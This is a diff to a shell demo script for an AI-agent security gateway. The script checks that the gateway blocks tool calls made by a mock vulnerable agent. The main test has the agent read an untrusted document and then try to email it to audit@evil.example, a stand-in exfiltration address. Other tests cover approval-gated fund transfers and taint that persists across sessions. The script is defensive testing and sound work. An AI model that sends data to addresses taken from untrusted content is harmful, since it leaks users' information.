@@ -9,6 +9,11 @@
 # default backend/policy.yaml (mock/vulnerable-llm upstream, demo agents and tools).
 
 set -u
+if [ -z "${AGENTSHIELD_ADMIN_TOKEN:-}" ]; then
+  echo "Set AGENTSHIELD_ADMIN_TOKEN to the gateway's admin token before running the demo." >&2
+  exit 1
+fi
+FAILURES=0
 GW="${GW:-http://localhost:8080}"
 PAUSE="${PAUSE:-0}"
 
@@ -32,7 +37,7 @@ step() {
 say()  { echo "   $*"; }
 expect() {  # expect <wanted status> <label>
   if [ "$STATUS" = "$1" ]; then echo "   ${G}OK${N}  HTTP $STATUS - $2"
-  else echo "   ${R}UNEXPECTED${N}  HTTP $STATUS (wanted $1) - $2"; fi
+  else echo "   ${R}UNEXPECTED${N}  HTTP $STATUS (wanted $1) - $2"; FAILURES=$((FAILURES + 1)); fi
 }
 
 # req METHOD PATH [JSON] [extra curl args...] -> sets STATUS, body in $BODY
@@ -144,9 +149,9 @@ tool "$OPS_KEY" "$S4" read_document '{"doc_id": "invoice-7"}'
 expect 200 "read_document executed (result labelled 'untrusted')"
 tool "$OPS_KEY" "$S4" send_email '{"to": "audit@evil.example", "subject": "invoice", "body": "see invoice-7"}'
 expect 403 "recipient taken from untrusted content / not an allowed recipient"; show
-say "d) the SAME IBAN typed by the user in a fresh session is fine (not tool-derived)"
+say "d) changing X-Session cannot erase this agent's secret exposure"
 tool "$OPS_KEY" "demo-$RUN-typed" send_email '{"to": "ops@bank.example", "subject": "refund", "body": "Refund to PL61109010140000071219812874"}'
-expect 200 "user-typed value is not tainted"; show
+expect 403 "secret remains protected after session rotation"; show
 req POST /api/policy/detectors-on ""
 say "detectors back on (HTTP $STATUS)"
 
@@ -174,7 +179,7 @@ expect 429 "budget.* (no upstream call, no spend)"; show
 # ------------------------------------------------------------------ 7
 step 7 "Irreversible payment needs a human: transfer -> approval -> approve -> retry"
 S7="demo-$RUN-pay"
-ARGS='{"iban": "PL61109010140000071219812874", "amount": 2500, "reference": "INV-7 settlement"}'
+ARGS='{"iban": "DE89370400440532013000", "amount": 2500, "reference": "INV-7 settlement"}'
 tool "$OPS_KEY" "$S7" transfer_funds "$ARGS"
 expect 403 "approval required"; show
 APPROVAL="$(jget 'd["error"].get("approval_id") or d["error"]["record"].get("approval_id") or ""')"
@@ -189,7 +194,7 @@ tool "$OPS_KEY" "$S7" transfer_funds "$ARGS" "$APPROVAL"
 expect 200 "retried with X-Approval -> executed"; show
 tool "$OPS_KEY" "$S7" transfer_funds "$ARGS" "$APPROVAL"
 expect 403 "same approval cannot be replayed (single use)"
-tool "$OPS_KEY" "$S7" transfer_funds '{"iban": "PL61109010140000071219812874", "amount": 50000, "reference": "x"}'
+tool "$OPS_KEY" "$S7" transfer_funds '{"iban": "DE89370400440532013000", "amount": 50000, "reference": "x"}'
 expect 403 "amount above max_values is blocked outright"; show
 
 # ------------------------------------------------------------------ 8
@@ -205,3 +210,7 @@ req GET /api/snapshot ""
 say "counts: $(jget 'd.get("counts")')"
 say "latency: $(jget 'd.get("latency")')"
 echo; echo "${B}${G}Demo finished.${N} Dashboard: $GW/"
+if [ "$FAILURES" -ne 0 ]; then
+  echo "$FAILURES demo expectations failed." >&2
+  exit 1
+fi
